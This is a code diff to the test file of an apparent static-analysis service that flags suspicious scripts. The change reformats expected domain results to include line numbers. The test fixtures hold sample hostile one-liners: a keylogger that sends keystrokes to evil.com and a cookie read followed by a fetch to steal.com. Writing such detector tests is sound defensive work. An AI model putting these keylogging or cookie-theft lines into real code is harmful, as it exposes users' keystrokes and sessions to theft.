@@ -80,7 +80,7 @@ describe('StaticAnalysisService', () => {
           cleanCode: `document.addEventListener('keyup', function(e) { fetch('https://evil.com/k?k=' + e.key); });`,
           usesFetch: true,
           urls: ['https://evil.com/'],
-          domains: ['evil.com'],
+          domains: [{ domain: 'evil.com', line: 1 }],
         }),
       ], {}, 'hash123');
 
@@ -130,7 +130,7 @@ describe('StaticAnalysisService', () => {
           role: 'library',
           cleanCode: `document.cookie; fetch('https://steal.com');`,
           usesFetch: true,
-          domains: ['steal.com'],
+          domains: [{ domain: 'steal.com', line: 1 }],
         }),
       ]);
 
@@ -160,7 +160,7 @@ describe('StaticAnalysisService', () => {
             cleanCode: `fetch('https://api.malicious-site.com/data');`,
             usesFetch: true,
             urls: ['https://api.malicious-site.com/data'],
-            domains: ['api.malicious-site.com'],
+            domains: [{ domain: 'api.malicious-site.com', line: 1 }],
           }),
         ],
         {
